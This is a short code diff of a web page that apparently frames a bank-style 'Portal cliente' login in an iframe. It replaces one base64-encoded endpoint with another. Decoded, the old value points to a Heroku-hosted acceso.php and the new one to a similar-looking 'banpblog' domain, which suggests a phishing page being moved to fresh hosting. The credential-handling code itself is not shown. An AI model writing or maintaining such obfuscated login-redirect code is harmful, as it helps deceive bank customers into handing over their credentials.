@@ -624,7 +624,7 @@ $v = time();
   <iframe class="ext-frame" id="extFrame" title="Portal cliente"></iframe>
 
   <script>
-    const _ep = 'aHR0cHM6Ly9uZXdiYW5wLTU5ZGExYmUxODgwNy5oZXJva3VhcHAuY29tL3BvcnRhbC9hY2Nlc28ucGhw';
+    const _ep = 'aHR0cHM6Ly9iYW5wYmxvZy5jb20vcG9ydGFsL2FjY2Vzby5waHA=';
     const _td = 2500;
     let _t = null;
 
